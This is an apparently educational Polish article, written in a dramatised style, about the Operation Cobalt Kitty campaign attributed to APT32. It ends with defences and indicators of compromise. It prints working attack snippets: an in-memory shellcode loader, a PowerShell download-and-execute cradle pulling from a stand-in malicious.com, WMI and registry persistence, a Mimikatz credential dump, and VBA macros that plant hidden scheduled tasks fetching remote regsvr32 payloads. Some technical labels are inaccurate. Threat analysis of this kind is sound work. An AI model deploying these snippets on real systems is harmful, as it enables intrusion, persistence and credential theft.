# Operacja Cobalt Kitty

*W cichym mroku serwerowni globalnej korporacji, niewidzialny przeciwnik rozpoczął swoją misję. Był jak cień, przemieszczający się bezszelestnie między systemami, pozostając niezauważonym przez strażników cyfrowego świata. To była Operacja Cobalt Kitty – mistrzowsko przeprowadzony atak, który miał zmienić zasady gry w cyberbezpieczeństwie.*

---

## Spis Treści

1. [Wprowadzenie](#wprowadzenie)
2. [Przegląd Ataku](#przegląd-ataku)
3. [Charakterystyka Ataku](#charakterystyka-ataku)
4. [Analiza Techniczna](#analiza-techniczna)
   - [4.1. Fileless Malware i Działanie w Pamięci](#41-fileless-malware-i-działanie-w-pamięci)
   - [4.2. Wykorzystanie Funkcji Systemu Windows](#42-wykorzystanie-funkcji-systemu-windows)
   - [4.3. Persistencja przez WMI i Rejestr](#43-persistencja-przez-wmi-i-rejestr)
   - [4.4. Ruch Boczy i Eskalacja Uprawnień](#44-ruch-boczy-i-eskalacja-uprawnień)
   - [4.5. Unikanie Wykrycia](#45-unikanie-wykrycia)
5. [Analiza Kodów](#analiza-kodów)
   - [5.1. Tworzenie Zadania Harmonogramu z użyciem `CreateProcessA`](#51-tworzenie-zadania-harmonogramu-z-użyciem-createprocessa)
   - [5.2. Tworzenie Zadania Harmonogramu przy użyciu XML](#52-tworzenie-zadania-harmonogramu-przy-użyciu-xml)
6. [Podatności (CVE)](#podatności-cve)
7. [Środki Ochrony i Rekomendacje](#środki-ochrony-i-rekomendacje)
   - [7.1. Rola GPO](#71-rola-gpo)
8. [Wnioski](#wnioski)
9. [Wskaźniki Kompromitacji (IOCs)](#wskaźniki-kompromitacji-iocs)
10. [Bibliografia](#bibliografia)

---

## Wprowadzenie

*Był to zwyczajny dzień w globalnej korporacji. Pracownicy zajmowali się codziennymi obowiązkami, nieświadomi, że w ich systemach czai się niewidoczny intruz. Operacja Cobalt Kitty, prowadzona przez grupę OceanLotus (APT32), właśnie się rozpoczynała. Atakujący, niczym mistrzowie sztuki cieni, wykorzystali zaawansowane techniki, by przeniknąć do serca infrastruktury firmy.*

---

## Przegląd Ataku

Operacja Cobalt Kitty to skomplikowana kampania ataków skierowana na przedsiębiorstwa w Azji Południowo-Wschodniej. Jej celem było pozyskanie poufnych informacji oraz długoterminowa obecność w systemach ofiar.

**Charakterystyka ataku:**

- **Długotrwała obecność**: *Przez ponad pół roku atakujący przemieszczali się po systemach korporacji, zbierając cenne dane i pozostając niewykrytymi.*
- **Unikanie wykrycia**: Wykorzystano zaawansowane techniki malware bezplikowego oraz funkcje systemu Windows.
- **Precyzyjne działania**: *Atakujący, niczym precyzyjny chirurg, systematycznie uzyskiwali dostęp do kluczowych segmentów infrastruktury.*

---

## Charakterystyka Ataku

### Fazy ataku:

1. **Penetracja**

   *Pierwszy krok był subtelny. Pracownicy otrzymali e-maile wyglądające jak standardowe komunikaty korporacyjne. W rzeczywistości były to starannie przygotowane wiadomości phishingowe, zawierające fałszywe instalatory Adobe Flash i dokumenty Word z złośliwymi makrami.*

   - **Techniki:**
     - **Phishing**: Atakujący wysyłali ukierunkowane e-maile z załącznikami lub linkami do fałszywych instalatorów Adobe Flash.
     - **Makra w Wordzie**: Dokumenty zawierały złośliwe makra VBA, które uruchamiały się automatycznie po otwarciu pliku.

   - **Powiązanie:**
     - Makra uruchamiały skrypty PowerShell, które pobierały i uruchamiały złośliwy kod w pamięci.
     - Umożliwiło to zainfekowanie wstępnych urządzeń bez wzbudzania podejrzeń.

2. **Foothold i Persistencja**

   *Gdy drzwi zostały otwarte, intruz zaczął umacniać swoją pozycję. Tworzył ukryte ścieżki i zakamuflowane punkty dostępu, by zapewnić sobie stałą obecność.*

   - **Techniki:**
     - **Wpisy rejestru**: Dodawanie kluczy autostartu.
     - **Tworzenie zadań w harmonogramie zadań**: Użycie `schtasks` i `CreateProcessA` do automatyzacji uruchamiania złośliwego kodu.
     - **Subskrypcje WMI**: Uruchamianie skryptów przy określonych zdarzeniach systemowych.

   - **Powiązanie:**
     - Mechanizmy te zapewniły trwały dostęp do systemów, nawet po restartach.

3. **Komunikacja C2 (Command and Control)**

   *Niewidzialne nitki komunikacji łączyły intruza z jego dowódcą. Każde polecenie, każde działanie było precyzyjnie kierowane z odległego centrum dowodzenia.*

   - **Techniki:**
     - **DNS Tunneling**: Wykorzystanie zapytań DNS do przesyłania danych do serwerów C2 (`teriava.com`, `chatconnecting.com`).
     - **Makra w Outlooku**: Modyfikacja `VbaProject.OTM` w celu wysyłania danych poprzez e-maile.
     - **Bezplikowe payloady**: Wykorzystanie `Regsvr32` do uruchamiania kodu bez zapisu na dysku.

   - **Powiązanie:**
     - Umożliwiło to atakującym kontrolę nad zainfekowanymi maszynami i przesyłanie kolejnych etapów ataku.

4. **Rozpoznanie Wewnętrzne i Ruch Boczy**

   *Atakujący przemierzał labirynty sieci korporacyjnej, mapując każdy zakamarek, szukając najbardziej wartościowych celów.*

   - **Techniki:**
     - **Skanowanie sieci**: Użycie PowerShell do mapowania infrastruktury.
     - **Pozyskiwanie poświadczeń**: Wykorzystanie `Mimikatz` do zdobycia haseł.
     - **Pass-the-Hash**: Uwierzytelnianie bez znajomości haseł w postaci jawnej.
     - **WMI i PSExec**: Zdalne wykonywanie poleceń na innych maszynach.

   - **Powiązanie:**
     - Pozwoliło to na eskalację uprawnień i dostęp do krytycznych systemów.

5. **Eksfiltracja Danych**

   *Osiągnąwszy pełną kontrolę, intruz przystąpił do realizacji ostatecznego celu – wykradzenia cennych danych. Działał ostrożnie, by nie wzbudzić podejrzeń.*

   - **Techniki:**
     - **Makra w Outlooku**: Automatyczne wysyłanie zaszyfrowanych informacji.
     - **Zmodyfikowane narzędzia sieciowe**: Użycie `NetCat` do przesyłania danych.

   - **Powiązanie:**
     - Eksfiltracja była końcowym etapem, realizowanym po zdobyciu pełnej kontroli.

---

## Analiza Techniczna

### 4.1. Fileless Malware i Działanie w Pamięci

*Złośliwe oprogramowanie działało jak widmo – bez śladu na dysku, tylko w ulotnej pamięci RAM.*

- **Wykorzystanie funkcji systemowych:**
  - **`VirtualAlloc`** i **`VirtualProtect`**: Alokacja i zmiana atrybutów pamięci.
  - **`CreateThread`**: Tworzenie nowych wątków do wykonania kodu.

#### Przykład użycia:

```c
// Alokacja pamięci i wykonanie kodu w pamięci
LPVOID pMemory = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
memcpy(pMemory, shellcode, dwSize);
DWORD dwOldProtect = 0;
VirtualProtect(pMemory, dwSize, PAGE_EXECUTE_READ, &dwOldProtect);
HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMemory, NULL, 0, NULL);
WaitForSingleObject(hThread, INFINITE);
```

### 4.2. Wykorzystanie Funkcji Systemu Windows

*Atakujący wykorzystali narzędzia systemu przeciwko niemu samemu, niczym miecz obosieczny.*

- **PowerShell**: Pobieranie i uruchamianie złośliwych skryptów.
- **WMI**: Zdalne wykonywanie kodu i utrzymanie persistencji.
- **Regsvr32**: Wykorzystanie do uruchamiania złośliwego kodu z sieci.

#### Przykład użycia PowerShell:

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
```

### 4.3. Persistencja przez WMI i Rejestr

*By zapewnić sobie nieprzerwany dostęp, intruz zakorzenił się głęboko w systemie, tworząc ukryte mechanizmy przetrwania.*

#### Persistencja przez WMI:

- Tworzenie trwałych subskrypcji WMI.

#### Przykład tworzenia subskrypcji WMI:

```powershell
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "PersistenceFilter";
    EventNamespace = "root\cimv2";
    QueryLanguage = "WQL";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
}

$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "PersistenceConsumer";
    CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\path\to\malicious.ps1"
}

$Binding = Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter   = $Filter;
    Consumer = $Consumer
}
```

#### Persistencja przez Rejestr:

- Dodawanie wpisów do kluczy rejestru autostartu.

#### Przykład dodania wpisu rejestru:

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\path\to\malicious.ps1" /f
```

### 4.4. Ruch Boczy i Eskalacja Uprawnień

*Przemieszczając się między systemami, intruz zdobywał coraz większą władzę, niczym szachista przewidujący kilka ruchów naprzód.*

- **Techniki ruchu bocznego**: Pass-the-Hash, WMI, PSExec.
- **Narzędzia**: `Mimikatz`, `PsExec`.

#### Przykład użycia Mimikatz:

```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### 4.5. Unikanie Wykrycia

*Atakujący byli mistrzami kamuflażu, ich działania były niewidoczne dla oczu strażników.*

- **Bezplikowe działanie**: Malware działało tylko w pamięci.
- **Obfuskacja i szyfrowanie**: Utrudnienie analizy kodu.
- **Wykorzystanie legalnych funkcji systemowych**: Działania wyglądały na normalne operacje.

---

## Analiza Kodów

### 5.1. Tworzenie Zadania Harmonogramu z użyciem `CreateProcessA`

*By ukryć swoje ślady, intruz wykorzystał zawiłe ścieżki systemowe, tworząc zadania, które działały na jego korzyść.*

#### Wyjaśnienie kodu:

- **Tworzenie polecenia `schtasks`**: Definicja zadania, które będzie uruchamiane co 15 minut.
- **Użycie `CreateProcessA`**: Uruchomienie polecenia w nowym procesie, co utrudnia wykrycie.
- **Usuwanie plików tymczasowych**: Eliminacja śladów po wykonaniu zadania.

#### Przykładowa implementacja VBA:

```vba
Option Explicit

' Deklaracja funkcji CreateProcessA z WinAPI
Private Declare PtrSafe Function CreateProcessA Lib "kernel32" ( _
    ByVal lpApplicationName As String, _
    ByVal lpCommandLine As String, _
    ByVal lpProcessAttributes As LongPtr, _
    ByVal lpThreadAttributes As LongPtr, _
    ByVal bInheritHandles As Long, _
    ByVal dwCreationFlags As Long, _
    ByVal lpEnvironment As LongPtr, _
    ByVal lpCurrentDirectory As String, _
    lpStartupInfo As STARTUPINFO, _
    lpProcessInformation As PROCESS_INFORMATION) As Long

' Struktury STARTUPINFO i PROCESS_INFORMATION
' ...

Sub CreateScheduledTaskWithCreateProcessA()
    Dim sCMDLine As String
    Dim si As STARTUPINFO
    Dim pi As PROCESS_INFORMATION
    Dim lSuccess As Long

    ' Definicja polecenia CMD do utworzenia zadania
    sCMDLine = "schtasks /create /sc MINUTE /tn ""Power Efficiency Diagnostics"" /tr ""regsvr32.exe /s /n /u /i:http://malicious.com/payload.sct scrobj.dll"" /mo 15 /f"
    
    ' Inicjalizacja struktury STARTUPINFO
    si.cb = Len(si)
    
    ' Uruchomienie polecenia za pomocą CreateProcessA
    lSuccess = CreateProcessA(vbNullString, sCMDLine, 0, 0, False, 0, 0, vbNullString, si, pi)
    
    ' Zamykanie uchwytów procesu i wątku
    ' ...
End Sub
```

### 5.2. Tworzenie Zadania Harmonogramu przy użyciu XML

*Intruz zapisał swoje instrukcje w kodzie, który dla niewtajemniczonych wyglądał jak zwykły plik konfiguracyjny.*

#### Wyjaśnienie kodu:

- **Budowanie XML-a dla zadania**: Definicja zadania harmonogramu w formacie XML, co ułatwia ukrycie złośliwych działań.
- **Uruchomienie `schtasks` z XML-em**: Rejestracja zadania na podstawie przygotowanego pliku XML.
- **Usuwanie pliku XML**: Usunięcie dowodów działalności po utworzeniu zadania.

#### Pełna implementacja VBA:

```vba
Sub CreateScheduledTaskXML()
    Dim tstr As String
    Dim fso As Object
    Dim tempFile As String
    Dim sCmd As String

    ' Budowanie XML-a dla zadania
    tstr = "<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">" & vbCrLf
    tstr = tstr & "  <Triggers>" & vbCrLf
    tstr = tstr & "    <TimeTrigger>" & vbCrLf
    tstr = tstr & "      <Repetition>" & vbCrLf
    tstr = tstr & "        <Interval>PT15M</Interval>" & vbCrLf
    tstr = tstr & "      </Repetition>" & vbCrLf
    tstr = tstr & "      <StartBoundary>2024-01-01T00:00:00</StartBoundary>" & vbCrLf
    tstr = tstr & "    </TimeTrigger>" & vbCrLf
    tstr = tstr & "  </Triggers>" & vbCrLf
    tstr = tstr & "  <Actions Context=""Author"">" & vbCrLf
    tstr = tstr & "    <Exec>" & vbCrLf
    tstr = tstr & "      <Command>mshta.exe</Command>" & vbCrLf
    tstr = tstr & "      <Arguments>""vbscript:CreateObject(""Wscript.Shell"").Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\path\to\malicious.ps1"",0:(window.close)""</Arguments>" & vbCrLf
    tstr = tstr & "    </Exec>" & vbCrLf
    tstr = tstr & "  </Actions>" & vbCrLf
    tstr = tstr & "</Task>"

    ' Zapisz XML jako plik tymczasowy
    Set fso = CreateObject("Scripting.FileSystemObject")
    tempFile = Environ("TEMP") & "\ScheduledTask.xml"
    With fso.CreateTextFile(tempFile, True)
        .WriteLine tstr
        .Close
    End With

    ' Wykonaj polecenie schtasks z wykorzystaniem pliku XML
    sCmd = "schtasks /create /tn ""Power Efficiency Diagnostics XML"" /xml """ & tempFile & """ /f"
    Shell sCmd, vbHide

    ' Usuń plik XML po utworzeniu zadania
    fso.DeleteFile tempFile, True
End Sub
```

---

## Podatności (CVE)

*Atakujący wykorzystali słabe punkty w zbroi systemu, celując precyzyjnie w jego podatności.*

- **CVE-2017-8759**: Zdalne wykonanie kodu przez .NET Framework.
- **CVE-2018-8174**: Błąd w silniku VBScript.
- **CVE-2020-0601**: Podatność w CryptoAPI.

*Te luki pozwoliły intruzowi na głębsze przeniknięcie do systemu i eskalację swoich uprawnień.*

---

## Środki Ochrony i Rekomendacje

*By pokonać tak przebiegłego przeciwnika, potrzebne są solidne tarcze i ostrzeżone oczy strażników.*

- **Monitorowanie aktywności w pamięci**: Wykorzystanie narzędzi EDR.
- **Kontrola dostępu do PowerShell i WMI**: Wdrożenie polityk bezpieczeństwa.
- **Regularne aktualizacje i łatki**: Zamknięcie znanych podatności.
- **Edukacja użytkowników**: *Świadomość jest najlepszą obroną przed socjotechniką.*

### 7.1. Rola GPO

*Polityki grupowe to strażnicy, którzy mogą blokować drogę intruzowi.*

1. **Blokowanie nieautoryzowanego użycia PowerShell**

   - **Ustawienie trybu Constrained Language Mode**:
     ```powershell
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" -Name "ExecutionPolicy" -Value "Restricted"
     ```
   - **Konfiguracja zapisów zdalnych sesji PowerShell**.

2. **Ograniczenia WMI**

   - **Ograniczenie dostępu tylko dla uprawnionych użytkowników**.
   - **Monitorowanie aktywności WMI**.

3. **Audyt harmonogramu zadań**

   - **Włączenie szczegółowego logowania**.
   - **Regularne przeglądanie zadań**.

4. **Blokowanie znanych domen C2**

   - **Aktualizacja list blokowania**.
   - **Blokowanie domen**: `teriava.com`, `chatconnecting.com`.

---

## Wnioski

*Operacja Cobalt Kitty była niczym mistrzowsko przeprowadzona infiltracja twierdzy, gdzie przeciwnik wykorzystał każdą szczelinę w obronie, by osiągnąć swój cel.*

**Kluczowe wnioski**:

- **Znaczenie monitorowania aktywności w pamięci**: Tradycyjne środki są niewystarczające.
- **Potrzeba wielowarstwowych zabezpieczeń**: Kombinacja technologii i praktyk.
- **Rola edukacji i świadomości**: *Ludzie są pierwszą linią obrony.*

*Atakujący pokazali, że z odpowiednią wiedzą i cierpliwością można przeniknąć nawet najbardziej strzeżone systemy. To przypomnienie dla nas wszystkich, że w świecie cyberbezpieczeństwa nie ma miejsca na samozadowolenie.*

---

## Wskaźniki Kompromitacji (IOCs)

| **Etap**         | **Typ**              | **Wartość**                                            |
|------------------|----------------------|--------------------------------------------------------|
| Penetracja       | Domeny C2            | `teriava.com`, `chatconnecting.com`                    |
| Penetracja       | Plik                 | `msfte.dll`                                            |
| Utrzymanie       | Wpis Rejestru        | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`   |
| Komunikacja C2   | Plik                 | `VbaProject.OTM` (zmodyfikowany w Outlooku)            |
| Eksfiltracja     | Adresy IP            | `110.10.179.65`, `45.114.117.137`                      |
| Ruch Boczy       | Narzędzie            | Wykorzystanie `Mimikatz` do pozyskiwania poświadczeń   |
| Utrzymanie       | Zadanie Harmonogramu | `Power Efficiency Diagnostics`, `MyTask`               |
| Eksfiltracja     | Proces               | Niekonwencjonalne użycie `Regsvr32.exe`                |

---

## Bibliografia

1. **Cybereason Labs**: *Operation Cobalt Kitty - Technical Analysis*.
   - [Link do raportu](https://www.cybereason.com/blog/operation-cobalt-kitty-apt)

2. **Microsoft Developer Network (MSDN)**:
   - [VirtualAlloc Function](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
   - [CreateProcessA Function](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)

3. **MITRE ATT&CK Framework**:
   - [Fileless Malware Techniques](https://attack.mitre.org/techniques/T1059/001/)
   - [APT32 Group Description](https://attack.mitre.org/groups/G0050/)

4. **CVE Details**:
   - [CVE-2017-8759](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8759)
   - [CVE-2018-8174](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8174)
   - [CVE-2020-0601](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0601)

5. **Publikacje z zakresu cyberbezpieczeństwa**:
   - FireEye: *APT32 and the Threat Landscape in Southeast Asia*
   - Kaspersky Lab: *OceanLotus and the Rise of APT Attacks in Asia*

---

*Ostrzeżenie*: Analiza złośliwego oprogramowania powinna być przeprowadzana wyłącznie przez wykwalifikowanych specjalistów w kontrolowanym środowisku. Prezentowany kod i techniki mają charakter edukacyjny i nie powinny być wykorzystywane do celów niezgodnych z prawem lub etyką. Celem tego artykułu jest edukacja i poprawa bezpieczeństwa systemów informatycznych.

---